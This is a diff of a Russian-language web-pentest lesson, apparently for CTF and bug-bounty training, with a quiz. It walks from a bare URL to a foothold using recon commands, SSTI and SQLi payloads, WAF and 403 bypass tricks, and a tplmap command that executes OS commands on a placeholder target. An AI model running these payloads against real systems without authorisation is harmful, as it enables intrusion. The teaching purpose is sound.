@@ -15,209 +15,172 @@ estimated_minutes: 34
 summary: "Decision-tree от «у меня есть URL» до первого подтверждённого вектора: фингерпринт → контент → параметры → триаж → выбор эксплойта, с командами на каждом узле."
 ---
 
-У вас есть только URL цели (или её IP). Дальше — самый неопределённый этап: непонятно, за что взяться. Этот плейбук превращает «непонятно» в **последовательность проверок с условиями**: на каждом шаге вы получаете факт, который либо ведёт вниз по дереву, либо закрывает ветку. Цель — довести дело до **первого подтверждённого вектора**, а не до «я посмотрел сайт и ушёл».
+## Задача
 
-## Дерево решения (общая карта)
+У тебя есть только URL — `https://target.tld`. Дальше самый неопределённый этап: непонятно, за что взяться. Этот плейбук превращает «непонятно» в **последовательность проверок с условиями**: каждый шаг даёт факт, который либо ведёт вниз по дереву, либо закрывает ветку. Цель — дойти до **первого подтверждённого вектора**, а не до «посмотрел сайт и ушёл».
 
-```
-[URL цели]
-   │
-   ├─(0) ПОДГОТОВКА: scope, прокси, куки, словари
-   │
-   ├─(1) ФИНГЕРПРИНТ ──► стек, версия, заголовки, cookies
-   │      │
-   │      ├─ узнал CMS/фреймворк/версию ──► ищи известные CVE (nuclei)
-   │      └─ кастомное приложение ──► иди в (2)
-   │
-   ├─(2) CONTENT DISCOVERY ──► скрытые пути, бэкапы, .git, API-доки
-   │      │
-   │      ├─ нашёл /admin, /api, /backup, .git ──► триаж ветки (5)
-   │      └─ пусто ──► смотри JS, robots.txt, sitemap, иди в (3)
-   │
-   ├─(3) PARAMETER DISCOVERY ──► какие входы вообще есть
-   │      │
-   │      └─ собрал список параметров ──► иди в (4)
-   │
-   ├─(4) VULN TRIAGE ──► что реагирует: ошибка/эхо/задержка/ID
-   │      │
-   │      └─ есть подозрение на класс ──► CONFIRM одной командой
-   │
-   └─(5) EXPLOIT SELECTION ──► выбрать класс и инструмент
-          │
-          └─► подтверждённый вектор ──► [FOOTHOLD]
-```
+## Данные, с которыми работаем
 
-## Шаг 0. Подготовка: scope, прокси, словари
+Один хост `https://target.tld`. Пройдём дерево: фингерпринт → контент → параметры → триаж → подтверждение.
 
-Прежде чем слать запросы — зафиксируйте рамки и настройте канал.
+## Шаг 0: подготовка — scope, прокси, словари
+
+Прежде чем слать запросы — настрой канал, чтобы всё шло в историю и воспроизводилось:
 
 ```bash
-# Кто отвечает, куда редиректит, что за сертификат
-curl -sS -k -D- -o /dev/null https://target.tld | head -30
+$ curl -sS -k -D- -o /dev/null https://target.tld | head -5
+HTTP/2 200
+server: nginx
+set-cookie: PHPSESSID=...
 
-# Через прокси (Burp) — чтобы всё шло в историю и можно было повторять
-curl -sS -k -x http://127.0.0.1:8080 https://target.tld -o /dev/null -w '%{http_code}\n'
-
-# Единый словарь путей (seclists) — не изобретайте свой на каждый хост
-ls /usr/share/seclists/Discovery/Web-Content/ | head
+$ curl -sS -k -x http://127.0.0.1:8080 https://target.tld -o /dev/null -w '%{http_code}\n'
+200
 ```
 
-**Условие ветвления:** если хост отдаёт `403` на всё — попробуйте `--path-as-is`, `-H 'X-Forwarded-For: 127.0.0.1'`, разные методы; если редиректит на SSO — зафиксируйте этот факт, авторизацию добавите позже.
+**Тупик:** не начинай с полного `-p-` портскана, если у тебя один веб-хост — это шумно и редко даёт foothold раньше контент-разведки.
 
-**Тупик:** не начинайте с полного `-p-` портскана, если у вас один веб-хост. Это шумно и редко даёт foothold раньше, чем контент-разведка.
-
-## Шаг 1. Фингерпринт: что это за приложение
-
-Нужно понять стек и версию — от этого зависит, искать CVE или копать логику.
+## Шаг 1: фингерпринт — что это за приложение
 
 ```bash
-# Паспорт хоста: статус, заголовки, титул, технологии, TLS
-httpx -u https://target.tld -title -status-code -tech-detect -server -td -sc -json -o httpx.json
+$ httpx -u https://target.tld -title -status-code -tech-detect -server
+https://target.tld [200] [Target App] [nginx] [PHP/8.1.2]
 
-# Заголовки и cookie вручную
-curl -sSI https://target.tld
-
-# Что за веб-сервер и язык (по ошибкам, расширениям, кукам)
-whatweb -a 3 https://target.tld
-
-# Быстрый шаблонный скан известных CVE/мисконфигов
-nuclei -u https://target.tld -severity critical,high,medium -silent -j -o nuclei.json
+$ nuclei -u https://target.tld -severity critical,high,medium -silent
+[nginx-version] [http] [info] https://target.tld
 ```
-
-На что смотреть в ответе:
 
 | Признак | Что значит | Куда идти |
 |---------|-----------|-----------|
-| `X-Powered-By: PHP/8.1` | PHP-стек | LFI/RCE-ветки, `web-playbook-file-to-rce` |
-| `Server: nginx` + `Set-Cookie: ...` | кастомное приложение | контент-разведка (шаг 2) |
-| `wp-content`, `drupal`, `_next` | известная CMS/фреймворк | CVE по версии, `nuclei -tags <product>` |
-| `graphql`, `/api/v1` | API | `web-playbook-injection-triage`, API-ветка |
-| `WWW-Authenticate: Basic` | базовая аутентификация | `web-playbook-auth-bypass` |
+| `X-Powered-By: PHP/8.1` | PHP-стек | LFI/RCE-ветки |
+| `wp-content`, `_next`, `drupal` | известная CMS/фреймворк | CVE по версии |
+| `/api/v1`, `graphql` | API | ветка инъекций/IDOR |
+| `WWW-Authenticate: Basic` | базовая аутентификация | auth-плейбук |
 
-**Условие ветвления:** узнали точную версию продукта → ищите её CVE (не grep'ом по именам шаблонов, а по `-tags`/CVE-id). Не узнали — идите в контент.
+**Условие ветвления:** узнал точную версию продукта → ищи CVE (не grep'ом по именам шаблонов, а по `-tags`/CVE-id). Не узнал — иди в контент.
 
-## Шаг 2. Content discovery: что спрятано
-
-Перебираем пути и файлы. Только после быстрого фингерпринта — иначе будете фаззить вслепую.
+## Шаг 2: content discovery — что спрятано
 
 ```bash
-# Директории и файлы (ffuf)
-ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-     -u https://target.tld/FUZZ -mc 200,204,301,302,307,401,403 -ac -c
-
-# Расширения
-ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
-     -u https://target.tld/FUZZ -e .php,.bak,.old,.zip,.tar.gz,.env,.sql -ac
-
-# Специфично для веба: доки, бэкапы, VCS, конфиги
-for p in .git/config .env backup.zip swagger.json openapi.json api-docs \
-         robots.txt sitemap.xml .well-known/security.txt; do
-  curl -s -o /dev/null -w "%{http_code} $p\n" https://target.tld/$p
-done
+$ ffuf -w raft-medium-directories.txt -u https://target.tld/FUZZ \
+       -mc 200,204,301,302,307,401,403 -ac -s
+/admin     [Status: 302, Size: 0]
+/api       [Status: 200, Size: 1024]
+/.git      [Status: 301, Size: 178]
 ```
 
-**Условие ветвления:**
-- `/.git/` открыт → дампните репозиторий (`git-dumper`) → исходники = точные баги.
-- `/swagger.json`, `/openapi.json`, `/api-docs` → у вас полная карта API → шаг 3.
-- `/backup.zip`, `*.bak`, `*.old` → скачивайте и читайте исходники/конфиги.
-- `/admin`, `/manager`, `/console` → `web-playbook-auth-bypass`.
+**Условия ветвления:**
+- `/.git/` открыт → дампни репозиторий (`git-dumper`) → исходники = точные баги.
+- `/swagger.json`, `/openapi.json`, `/api-docs` → полная карта API.
+- `/backup.zip`, `*.bak`, `*.old` → скачивай и читай.
+- `/admin`, `/manager`, `/console` → auth-плейбук.
 
-**Тупик:** 404 на всё и нет редиректов — не перебирайте ещё пять словарей. Переходите к разбору JS: там реальные эндпоинты приложения.
+**Тупик:** 404 на всё и нет редиректов — не перебирай ещё пять словарей, переходи к разбору JS: там реальные эндпоинты приложения.
 
-## Шаг 3. Parameter discovery: какие входы есть
-
-Приложение может иметь десятки скрытых параметров. Их находят в JS, в HTML и фаззингом.
+## Шаг 3: parameter discovery — какие входы есть
 
 ```bash
-# Вытащить все URL и параметры из фронтенд-JS
-cat $(curl -s https://target.tld | grep -oE '/static/[^"]+\.js') 2>/dev/null \
-  | grep -oE '(/api/[a-zA-Z0-9_/]+|\?[a-zA-Z0-9_]+=)' | sort -u
+$ curl -s https://target.tld/static/app.js | grep -oE '/api/[a-zA-Z0-9_/]+' | sort -u
+/api/v1/user
+/api/v1/orders
 
-# Скроить параметры на известном эндпоинте
-ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-     -u 'https://target.tld/search?FUZZ=test' -fs 0 -ac -c
-
-# Проверить методы и заголовки
-for m in GET POST PUT PATCH DELETE OPTIONS; do
-  curl -s -o /dev/null -w "$m %{http_code}\n" -X $m https://target.tld/api/user
-done
+$ ffuf -w burp-parameter-names.txt -u 'https://target.tld/search?FUZZ=test' -fs 0 -ac -s
+q          [Status: 200, Size: 5211]
+name       [Status: 200, Size: 5300]
 ```
 
-**Условие ветвления:** если в JS нашлись пути вида `/api/v1/...` — это API, идите в ветку BOLA/IDOR и инъекций. Если параметр числовой (`id=123`) — сразу триаж на IDOR и SQLi.
+**Условие ветвления:** пути вида `/api/v1/...` → ветка BOLA/IDOR; числовой параметр (`id=123`) → триаж на IDOR и SQLi; `name` с изменённым размером → кандидат на SSTI/XSS.
 
-## Шаг 4. Vuln triage: что реагирует
+## Шаг 4: vuln triage — что реагирует
 
-Теперь на каждый параметр — быстрая проверка класса. Не пишите payload'ы руками по одному — прогоните набор и смотрите на **отклонения** (ошибка, эхо, задержка, другой размер ответа).
+Не пиши payload'ы руками — прогони набор и смотри на **отклонения** (ошибка, эхо, задержка, размер):
 
 ```bash
-# Базовый ответ — точка отсчёта
-curl -s -o /dev/null -w 'size=%{size_download} time=%{time_total}\n' 'https://target.tld/search?q=test'
+$ curl -s -o /dev/null -w 'size=%{size_download}\n' 'https://target.tld/search?q=test'
+size=5211
 
-# Ошибки БД/шаблонов/фреймворка — одиночная кавычка и фигурные скобки
-for p in "'" '"' '{{7*7}}' '${7*7}' '%00' '..%2f'; do
-  curl -s -o /dev/null -w "payload=$p code=%{http_code} size=%{size_download}\n" \
-    --get --data-urlencode "q=$p" https://target.tld/search
-done
-
-# Время: если ответ «завис» — возможен time-based
-time curl -s -o /dev/null 'https://target.tld/search?q=test%27%20AND%20SLEEP(5)--%20-'
+$ curl -s --get --data-urlencode 'name={{7*7}}' 'https://target.tld/greet'
+Hello, 49!
 ```
 
 Матрица триажа:
 
 | Реакция на payload | Вероятный класс | Следующий шаг |
 |--------------------|-----------------|---------------|
-| Ошибка SQL (`You have an error in your SQL syntax`) | SQLi | `web-playbook-injection-triage` |
-| `49` в ответе на `{{7*7}}` | SSTI | `web-ssti`, tplmap |
-| Содержимое `/etc/passwd` | LFI | `web-playbook-file-to-rce` |
-| Ответ задержался ровно на N сек | time-based SQLi | `web-playbook-injection-triage` |
-| Данные другого пользователя по смене `id` | IDOR | `web-playbook-auth-bypass` |
-| Заголовок `Location:` на ваш хост | open redirect / SSRF | `web-playbook-ssrf-to-internal` |
-| Ошибка «template not found», «no such file» | path traversal | `web-playbook-file-to-rce` |
+| Ошибка SQL | SQLi | injection-triage |
+| `49` на `{{7*7}}` | SSTI | tplmap |
+| Содержимое `/etc/passwd` | LFI | file-to-rce |
+| Задержка ровно N сек | time-based SQLi | injection-triage |
+| Чужой объект по смене `id` | IDOR | auth-плейбук |
+| `Location:` на твой хост | open redirect / SSRF | ssrf-плейбук |
 
-**Условие ветвления:** реакция есть → CONFIRM одной командой (шаг 5). Реакции нет ни на что → вернитесь к шагу 2/3, вы не нашли нужный вход.
+**Условие ветвления:** реакция есть → подтверди одной командой. Реакции нет ни на что → вернись к шагам 2–3, ты не нашёл нужный вход.
 
-## Шаг 5. Exploit selection: выбрать класс и подтвердить
-
-Доведите подозрение до воспроизводимого PoC. Дальше — профильный плейбук.
+## Шаг 5: exploit selection — выбрать класс и подтвердить
 
 ```bash
-# Пример: подтверждение SQLi (руками, до sqlmap)
-curl -s 'https://target.tld/item?id=1%20AND%201=1' | wc -c
-curl -s 'https://target.tld/item?id=1%20AND%201=2' | wc -c   # разный размер = boolean SQLi
+# SSTI подтверждён: {{7*7}} вернул 49
+$ tplmap -u 'https://target.tld/greet?name=test' --os-cmd id
+uid=33(www-data) gid=33(www-data)
 
-# Пример: подтверждение IDOR
-curl -s -b "session=$TOKEN" 'https://target.tld/api/orders/1001' | jq .user_id
-curl -s -b "session=$TOKEN" 'https://target.tld/api/orders/1002' | jq .user_id  # чужой?
-
-# Пример: подтверждение SSTI
-curl -s --get --data-urlencode 'name={{7*7}}' 'https://target.tld/greet' | grep -o '49'
+# SQLi (руками, до sqlmap)
+$ curl -s 'https://target.tld/item?id=1 AND 1=1' | wc -c
+4821
+$ curl -s 'https://target.tld/item?id=1 AND 1=2' | wc -c
+0
 ```
 
 Дальше по классу:
 
-- SQLi / NoSQLi / LDAP / XPath → `web-playbook-injection-triage`
+- SQLi/NoSQLi/LDAP/XPath → `web-playbook-injection-triage`
 - логин, токены, IDOR, админка → `web-playbook-auth-bypass`
-- upload / LFI / traversal → `web-playbook-file-to-rce`
-- сервер ходит по вашему URL → `web-playbook-ssrf-to-internal`
+- upload/LFI/traversal → `web-playbook-file-to-rce`
+- сервер ходит по твоему URL → `web-playbook-ssrf-to-internal`
+
+## Полный прогон от начала до конца
+
+1. `curl -D-` → nginx, `PHPSESSID` (PHP).
+2. `httpx -td` → `PHP/8.1.2`; `nuclei` → версии.
+3. `ffuf` → `/admin`, `/api`, `/.git`.
+4. `git-dumper` → исходники; в JS — `/api/v1/user`.
+5. `ffuf` параметров → `name`.
+6. Триаж: `{{7*7}}` → `49` → SSTI.
+7. `tplmap --os-cmd id` → `uid=33` → foothold.
 
 ## Если не сработало — пробуй это
 
-- **Ничего не находится.** Возьмите JS-бандлы и `robots.txt`/`sitemap.xml` — реальные пути там. Прогоните `katana` для краулинга и сравните с ffuf.
-- **Всё за 401/403.** Ищите обход: `--path-as-is`, `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For: 127.0.0.1`, смена метода, `?debug=1`, case-варианты (`/ADMIN`).
-- **Есть WAF, блокирует payload'ы.** Кодируйте: двойное URL-encoding, `%27` vs `'`, Unicode-нормализация, смена Content-Type.
-- **Параметр игнорируется.** Проверьте, что он вообще доходит: `X-Forwarded-Host`, HPP (`?q=a&q=b`), JSON-вложенность, multipart.
-- **Фреймворк без версии.** Определите по ошибкам/кукам/структуре (`_next`, `X-Runtime`, `django`, `PHPSESSID`) и ищите CVE для рантайма, а не приложения.
+- **Ничего не находится.** Возьми JS-бандлы и `robots.txt`/`sitemap.xml`; прогони `katana`.
+- **Всё за 401/403.** Обход: `--path-as-is`, `X-Original-URL`, `X-Forwarded-For: 127.0.0.1`, смена метода, `/ADMIN`.
+- **WAF блокирует.** Кодируй: двойное URL-encoding, `%27` vs `'`, Unicode-нормализация.
+- **Параметр игнорируется.** Проверь, что он доходит: HPP (`?q=a&q=b`), JSON-вложенность, multipart.
+- **Фреймворк без версии.** Определи по кукам/структуре (`_next`, `X-Runtime`) и ищи CVE рантайма.
 
-## Тупики (dead ends)
+## Тупики
 
-- Полный портскан одного веб-хоста «на всякий случай» — редко окупается против контент-разведки.
-- Перебор пяти словарей подряд, когда 404 у всех — сначала JS/robots/sitemap.
-- Ручной перебор payload'ов в браузере без сохранения запроса — вы не сможете воспроизвести PoC.
-- Запуск тяжёлого `sqlmap -r` на каждый параметр «на удачу» — сначала дешёвый триаж, потом автоматика.
-- Вывод «сайт безопасен» после одного скана без ручной проверки — отсутствие находки ≠ отсутствие уязвимости.
+- Полный портскан одного веб-хоста «на всякий случай» — против контент-разведки.
+- Перебор пяти словарей подряд при 404 у всех — сначала JS/robots/sitemap.
+- Ручной перебор payload'ов без сохранения запроса — PoC не воспроизведёшь.
+- `sqlmap -r` на каждый параметр «на удачу» — сначала дешёвый триаж.
+- Вывод «сайт безопасен» после одного скана — отсутствие находки ≠ отсутствие уязвимости.
+
+## Что мы теперь знаем
+
+- Путь от URL до foothold — это пять шагов с условиями ветвления.
+- Точная версия продукта → самый дешёвый путь к известной CVE.
+- `.git` и API-доки дают точные баги, а не догадки.
+- Триаж — это поиск отклонений (ошибка/эхо/задержка/размер), а не payload'ы наугад.
+- Подтверждение — воспроизводимый PoC, а не вывод сканера.
+
+## На что смотреть дальше
+
+- **Сначала дешёвое.** Дефолты, `.git`, доки — до единого payload'а.
+- **Контекст параметра.** Проверяй все точки входа: query, JSON, заголовок, cookie.
+- **OOB-канал.** Collaborator/interactsh для blind-багов.
+- **Согласование.** Деструктив (`--os-shell`, DoS) — только по договорённости.
+- **Фиксация тупиков.** Отрицательный результат закрывает ветку.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Что делать СРАЗУ после того, как фингерпринт показал точную версию CMS?"
@@ -236,14 +199,14 @@ curl -s --get --data-urlencode 'name={{7*7}}' 'https://target.tld/greet' | grep 
     - "Только версию сервера"
   answer: 1
   explanation: "Дамп .git возвращает исходники — по ним видны реальные уязвимости."
-- question: "Ответ на ' завис на 5 секунд, а на обычный ввод — мгновенный. Что это?"
+- question: "Ответ на {{7*7}} вернул 49. Что это значит?"
   options:
     - "Сетевой лаг"
-    - "Признак time-based SQL-инъекции"
-    - "SSTI"
+    - "Сервер выполнил выражение — это SSTI"
     - "XSS"
+    - "SQL-инъекция"
   answer: 1
-  explanation: "Контролируемая задержка от payload — классический признак time-based SQLi."
+  explanation: "Вычисление арифметики означает, что сервер исполняет шаблон."
 - question: "Что превращает подозрение сканера в подтверждённую находку?"
   options:
     - "Скриншот сканера"
@@ -259,12 +222,16 @@ curl -s --get --data-urlencode 'name={{7*7}}' 'https://target.tld/greet' | grep 
     - "Сменить браузер"
     - "Перезагрузить сервер"
   answer: 1
-  explanation: "Сначала убедитесь, что значение реально доходит до обработчика (метод/кодировка/дублирование)."
+  explanation: "Сначала убедитесь, что значение реально доходит до обработчика."
 ```
+
+## Куда дальше
+
+Дальше (`web-playbook-injection-triage`) мы разберём второй плейбук раннего этапа — триаж инъекции до дампа данных. А пока главное запомни: от URL до foothold ведёт фиксированная последовательность, и на каждом шаге есть условие перехода.
 
 ## Где пригодится
 
 - **CTF (Web):** быстрый и дисциплинированный путь от URL к первому вектору под таймером.
 - **Bug bounty:** порядок «дешёвое → дорогое» окупается на широком scope.
-- **Пентест:** каждый шаг даёт артефакт (команда + ответ), из которого собирается отчёт.
-- **Работа (AppSec):** понимание типичных входов помогает строить чек-листы и защиту.
+- **Пентест:** каждый шаг даёт артефакт (команда + ответ) для отчёта.
+- **Работа (AppSec):** понимание типовых входов помогает строить чек-листы и защиту.
